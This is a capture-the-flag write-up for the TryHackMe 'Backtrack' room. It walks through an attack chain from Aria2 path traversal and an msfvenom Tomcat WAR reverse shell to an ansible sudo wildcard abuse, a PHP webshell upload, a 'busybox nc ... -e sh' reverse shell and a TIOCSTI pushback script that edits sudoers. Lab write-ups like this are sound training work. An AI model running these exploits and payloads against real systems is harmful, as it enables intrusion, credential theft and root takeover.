---
title: Backtrack
date: 2025-01-09
categories: [TryHackMe, CTF]
tags: [tryhackme, ctf, python, file_upload, path_traversal, webui_aria2, tomcat, ansible_playbook, ssh, burp, webshell, pspy64, tty_pushback]     # TAG names should always be lowercase
comments: false
image: /assets/img/tryhackme/ctf/backtrack/banner.png
---

> In [this room](https://tryhackme.com/r/room/backtrack), we will be daring to set foot where no one has. This room helped me to discover new privilege escalation techniques and possibilities to add to my CTF playbook. The target machine’s IP is changing during this write-up because I did this challenge over separated days.


## Recon & Initial Access

Here is what our nmap scan tells us :

```shell
nmap -sS -sV -T4 $TARGET
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-06 21:22 CET
Nmap scan report for 10.10.71.124
Host is up (0.070s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http            Apache Tomcat 8.5.93
8888/tcp open  sun-answerbook?
```

Out of the three services that are available, we want to check in priority the **HTTP webserver** on port `8080` and then the service called *sun-answerbook?* on port `8888`.

The HTTP service is, at first glance, the classic **Apache Tomcat** web page that is displayed once you’ve successfully installed it.

![1](/assets/img/tryhackme/ctf/backtrack/1.png)

When we connect to the second service on port `8888`, we land on the *Aria2 WebUI* page. **Aria2** is a lightweight multi-protocol & multi-source command-line download utility. It is designed to download files from various sources efficiently and supports a range of download protocols, including HTTP, HTTPS, FTP, SFTP, BitTorrent, and Metalink.

![2](/assets/img/tryhackme/ctf/backtrack/2.png)

For now, we try to enumerate the possible directories of the first web application. However, except for the basic Tomcat directories, we don’t find anything :

```shell
gobuster dir -u http://10.10.71.124:8080 -w /usr/share/wordlists/sec
lists/Discovery/Web-Content/common.txt -t 30 -x php,jpg,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.71.124:8080
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,jpg,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 18936 / 18940 (99.98%)
===============================================================
Finished
===============================================================
```

Then, maybe can we find something about **Aria2 WebUI** ? Well, the results were fast as by simply looking for vulnerabilities, the third link on the search page directs us to a [PoC of a Path Traversal vulnerability on Aria2 WebUI](https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e) (CVE-2023-39141), allowing us to read any file that the `www` user can read.

Let’s see if it also works on our case :

```shell
$ curl --path-as-is http://10.10.71.124:8888/../../../../../../../../.
./../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:122:MySQL Server,,,:/nonexistent:/bin/false
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
```

Indeed, it does work ! From this output, we see three *important* users : `orville`, `wilbur` and `tomcat` !

While we cannot access orville nor wilbur’s home folder, we can access `/opt/tomcat`. What are the interesting files to look for regarding tomcat ? All of them are in its `/conf` folder, the one we want to check is `tomcat-users.xml` :

```shell
$ curl --path-as-is http://10.10.71.124:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="[REDACTED]" roles="manager-script"/>

</tomcat-users>
```

Thankfully, we obtain some credentials for the user `tomcat` ! We will instead try to connect to the **Tomcat Manager** located at `http://<ip>:8080/manager/html`. 

However, this will not work because our user has the `manager-script` role. This role only allows to use the tomcat **scripting API** at `/manager/text/`.

What we will be doing is creating a reverse shell using **msfvenom** as a WAR file. What is a WAR file and why ? 

A WAR file (Web Application Archive) is a packaged file format used to distribute and deploy web applications in **Java-based servers**, such as **Apache Tomcat** (exactly what we deal with!). In security, attackers can craft WAR files containing malicious code such as JSP web shells to execute arbitrary commands.

Let’s generate our payload :

```shell
$ msfvenom -p java/shell_reverse_tcp LHOST=$LOCAL LPORT=4444 -f war -o
 revshell.war
Payload size: 13034 bytes
Final size of war file: 13034 bytes
Saved as: revshell.war
```

Now, we can upload the reverse shell using our scripting role with the following command :

```shell
curl -v -u tomcat:[PASSWORD] --upload-file revshell.war "http://10.10.71.124:8080/manager/text/deploy?path=/foo&update=true"
*   Trying 10.10.71.124:8080...
* Connected to 10.10.71.124 (10.10.71.124) port 8080 (#0)
* Server auth using Basic with user 'tomcat'
> PUT /manager/text/deploy?path=/foo&update=true HTTP/1.1
> Host: 10.10.71.124:8080
> Authorization: Basic dG9tY2F0Ok9QeDUyazUzRDhPa1RacHg0ZnI=
> User-Agent: curl/7.88.1
> Accept: */*
> Content-Length: 13034
> Expect: 100-continue
>
< HTTP/1.1 100
* We are completely uploaded and fine
< HTTP/1.1 200
< Cache-Control: private
< X-Frame-Options: DENY
< X-Content-Type-Options: nosniff
< Content-Type: text/plain;charset=utf-8
< Transfer-Encoding: chunked
< Date: Mon, 06 Jan 2025 21:37:53 GMT
<
OK - Deployed application at context path [/foo]
* Connection #0 to host 10.10.71.124 left intact
```

We set up our listener and connect to `http://10.10.71.124:8080/foo` :

```shell
$ rlwrap nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.71.124.
Ncat: Connection from 10.10.71.124:48934.
whoami
tomcat
```

We get our reverse shell, we [upgrade](https://0xffsec.com/handbook/shells/full-tty/) it and recover the first flag located inside the tomcat folder.

```shell
tomcat@Backtrack:~$ ls
ls
BUILDING.txt     NOTICE         RUNNING.txt  flag1.txt  temp
CONTRIBUTING.md  README.md      bin          lib        webapps
LICENSE          RELEASE-NOTES  conf         logs       work
tomcat@Backtrack:~$ cat flag1.txt
cat flag1.txt
THM{[REDACTED]}
```

## Switching User

As `tomcat` user, we need to know what we are able to do on the machine. Typing the `sudo -l` command is one way to know this :

```shell
tomcat@Backtrack:/opt/test_playbooks$ sudo -l
sudo -l
Matching Defaults entries for tomcat on Backtrack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
```

We realize that we can execute any ansible playbook located in the `/opt/test_playbooks/` folder, without password, as the user `wilbur`.

What are those playbooks ? There are **2** : `failed_login.yml` and `suspicious_ports.yml`.

```shell
tomcat@Backtrack:/opt/test_playbooks$ cat failed_login.yml
cat failed_login.yml
---
- name: Check for Failed Login Attempts
  hosts: localhost

  tasks:
    - name: Search for failed login attempts
      command: grep "Failed password" /var/log/auth.log
      register: failed_login_attempts
      ignore_errors: yes

    - name: Report failed login attempts
      debug:
        var: failed_login_attempts.stdout_lines
```

The `failed_login` playbook is searching for failed login attempts in the `auth.log` (so, on the machine)

```shell
tomcat@Backtrack:/opt/test_playbooks$ cat suspicious_ports.yml
cat suspicious_ports.yml
---
- name: Check for Suspicious Open Ports on Localhost
  hosts: localhost
  gather_facts: no

  tasks:
    - name: List open ports
      command: "netstat -tuln"
      register: open_ports

    - name: Check and report suspicious open ports
      debug:
        msg: "Suspicious port open: {{ item }}"
      with_items:
        - '9001'
        - '1337'
        - '4444'
        - '6666'
        - '6969'
        - '5555'
        - '31337'
        - '4141'
        - '9000'
      when: "'0.0.0.0:{{ item }}' in open_ports.stdout"
```

The `suspicious_ports` playbook is, as its name suggests, checking for suspicious open ports on the machine using a list of items.

But they are not very useful for us. Instead, we want to make our own ansible playbook :

```shell
---
- name: Add SSH key to wilbur
  hosts: localhost
  tasks:
    - name: Ensure .ssh directory exists
      file:
        path: /home/wilbur/.ssh
        state: directory
        owner: wilbur
        group: wilbur
        mode: 0700

    - name: Add authorized_keys
      copy:
        content: "ssh-rsa [SSH-KEY] user@attack-machine"
        dest: /home/wilbur/.ssh/authorized_keys
        owner: wilbur
        group: wilbur
        mode: 0600
```

This playbook will add our SSH public key in the `authorized_keys` file of wilbur’s `home/.ssh` folder. Then, we will be able to connect with the `wilbur` account using SSH.

How will we execute the ansible playbook ? In the output of `sudo -l`, we can clearly see the **wildcard** (*) in the authorized command, this will allow us to make a **directory path traversal**.

```shell
tomcat@Backtrack:~$ chmod 666 /tmp/add_ssh.yml #We allow the file to be accessed by anyone

tomcat@Backtrack:~$ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/add_ssh.yml
<-playbook /opt/test_playbooks/../../tmp/add_ssh.yml
[WARNING]: provided hosts list is empty, only localhost is available. Note that
the implicit localhost does not match 'all'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/connection/httpapi.py) as it seems to be invalid:
module 'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/connection/vmware_tools.py) as it seems to be invalid:
module 'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/connection/winrm.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/foreman.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/grafana_annotations.py) as it seems to be
invalid: module 'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/hipchat.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/nrdp.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/slack.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/splunk.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/sumologic.py) as it seems to be invalid:
module 'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'

PLAY [Add SSH key to wilbur] ***************************************************

TASK [Gathering Facts] *********************************************************
ok: [localhost]

TASK [Ensure .ssh directory exists] ********************************************
changed: [localhost]

TASK [Add authorized_keys] *****************************************************
changed: [localhost]

PLAY RECAP *********************************************************************
localhost                  : ok=3    changed=2    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
```

Now, we can connect via SSH on the `wilbur` account.

```console
$ ssh -i ./id_rsa wilbur@10.10.118.61
The authenticity of host '10.10.118.61 (10.10.118.61)' can't be established.
ED25519 key fingerprint is SHA256:0083wvLGeoh6f0CIO11O0TYxt6R1Hr7AB8xEhvgtm+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.118.61' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-173-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information disabled due to load higher than 1.0

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-Xmx1024M: command not found
wilbur@Backtrack:~$ id
uid=1004(wilbur) gid=1004(wilbur) groups=1004(wilbur)
```

Inside `wilbur`’s home folder, there is a text file called `from_orville.txt` telling us that Orville finished an image gallery web app and gives us credentials to test it :

```console
wilbur@Backtrack:~$ cat from_orville.txt
Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : [REDACTED]
```

Also, a hidden text file reminds us of `wilbur`’s password just in case we need to use it later :

```shell
wilbur@Backtrack:~$ cat .just_in_case.txt
in case i forget :

wilbur:[REDACTED]
```

In order to check if the application is running locally we can check the listening services using **netstat** :

```shell
wilbur@Backtrack:~$ netstat -tuln | grep LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:6800            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN
tcp6       0      0 :::8080                 :::*                    LISTEN
tcp6       0      0 :::6800                 :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 :::8888                 :::*                    LISTEN
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN
```

There is indeed a **web application** running on port `80`. However, we don’t really want to access to it only using curl so we will do **SSH Port Forwarding** to our attacker machine to access it using our browser.

```shell
 ssh -L 8081:127.0.0.1:80 wilbur@10.10.118.61 #We choose port 8081
```

And we land on the web application.

![3](/assets/img/tryhackme/ctf/backtrack/3.png)

On the Login tab, we can use the credentials we got from the text file. Once logged in, we are suggested to upload an image.

![4](/assets/img/tryhackme/ctf/backtrack/4.png)

I decide to craft a simple php webshell and try to disguise it as an image :

```shell
$ cat wbshll.php
<?php system($_GET['cmd']); ?>
```

The simple upload obviously doesn’t work so I tried intercepting the request using **BurpSuite** :

![5](/assets/img/tryhackme/ctf/backtrack/5.png)

However, when we want to execute a command, it does not work. It only makes us download the file. Surely, we cannot execute any php files in the `/uploads` directory.

![6](/assets/img/tryhackme/ctf/backtrack/6.png)

Hence, we want to upload the file somewhere else to execute it (by using path traversal) :

![7](/assets/img/tryhackme/ctf/backtrack/7.png)

And it works :

![9](/assets/img/tryhackme/ctf/backtrack/9.png)

![8](/assets/img/tryhackme/ctf/backtrack/8.png)

We can indeed executes the commands as `orville`. So we use [revshells.com](https://www.revshells.com/) to execute the following command and get a reverse shell as `orville`. Then, we head to `/home/orville` and recover the second flag.

```shell
busybox nc 10.14.83.7 5555 -e sh
```

```shell
$ rlwrap nc -lvnp 5555
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.118.225.
Ncat: Connection from 10.10.118.225:38284.
ls
css
dashboard.php
includes
index.php
login.php
logout.php
navbar.php
register.php
uploads
wbshll.jpg.php
SHELL=/bin/bash script -q /dev/null
orville@Backtrack:/var/www/html$ id
id
uid=1003(orville) gid=1003(orville) groups=1003(orville)
orville@Backtrack:/var/www/html$ cd /home/orville
orville@Backtrack:/home/orville$ ls
ls
flag2.txt  web_snapshot.zip
orville@Backtrack:/home/orville$ cat flag2.txt
cat flag2.txt
THM{[REDACTED]}
```

## Privilege Escalation

Once that done, the only thing that I didn’t check was the **processes**, so we will start **pspy64** (of course, we need to transfer it to the machine first). 

In the output of **pspy64**, we get something interesting :

![10](/assets/img/tryhackme/ctf/backtrack/10.png)

Here, we can see the person we connected as `root` before switching to `orville` to then take a snapshot of the web application in a **.zip file**. However, the user here used the command `su - orville`, which means that he loaded another shell environment (**orville’s** **environment as a new login shell**) while switching users. Also, we observe that this schema of commands is repeated periodically so it proves that it’s running using a **cronjob**.

This means that we could use a **[tty pushback vulnerability](https://www.errno.fr/TTYPushback.html)**  to make sure that the `root` user does a certain action when loading the `orville` shell environment, so we need to get a script and insert the execution command in `~/bash.rc` (for loading it at new shell login).

Here is the little modified script that we use to force `root` to write the following rule in the `/etc/sudoers` file (`orville ALL=(ALL:ALL) NOPASSWD: /bin/su -`) that will allow the `orville` user to connect to any user (and root) without password.

```python
import fcntl
import termios
import os

# Command to append sudoers rule
command = "echo 'orville ALL=(ALL:ALL) NOPASSWD: /bin/su -' >> /etc/sudoers\n"

# Push each character of the command to the terminal
for char in command:
    fcntl.ioctl(0, termios.TIOCSTI, char)
```

We save this script as `pushback.py` on the machine and force the automatic execution in `.bashrc` :

```shell
orville@Backtrack:/home/orville$ echo "/usr/bin/python3 /home/orville/pushback.py" >> ~/.bashrc

orville@Backtrack:/home/orville$ cat .bashrc
cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

[...]

if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
/usr/bin/python3 /home/orville/pushback.py
```

We wait for the cronjob to be executed and simply switch to root using `sudo su -`, then finally retrieve the third flag.

```shell
orville@Backtrack:/home/orville$ ps aux | grep bash
ps aux | grep bash
wilbur      1385  0.0  0.4   8276  4776 pts/0    Ss+  10:12   0:00 -bash
orville     1838  0.0  0.4   5164  4304 pts/1    Ts   10:15   0:00 bash -i
orville     2846  0.0  0.4   5164  4308 pts/2    Ts   10:23   0:00 bash -i
orville     3292  0.0  0.4   5164  4380 pts/3    Ss+  10:25   0:00 bash -i
orville    13812  0.0  0.4   5164  4588 pts/4    Ss+  11:38   0:00 bash -i
orville    14145  0.0  0.4   5164  4448 pts/6    Ss+  11:40   0:00 bash -i
orville    14589  0.0  0.4   5164  4464 pts/7    Ss+  11:43   0:00 bash -i
orville    14744  0.0  0.4   5164  4492 pts/8    Ts   11:44   0:00 bash -i
orville    15943  0.0  0.4   5164  4500 pts/5    Ss   11:52   0:00 bash -i
root       16360  2.0  0.5  10024  5088 pts/9    Ss+  11:55   0:00 -bash # This proves the cronjobs ran
orville    16372  0.0  0.4  10004  4884 pts/9    T    11:55   0:00 -bash
orville    16384  0.0  0.0   3304   652 pts/5    S+   11:55   0:00 grep --color=auto bash

orville@Backtrack:/home/orville$ sudo su -
sudo su -
root@Backtrack:~# ls
ls
flag3.txt  manage.py  snap
```

![11](/assets/img/tryhackme/ctf/backtrack/11.png)
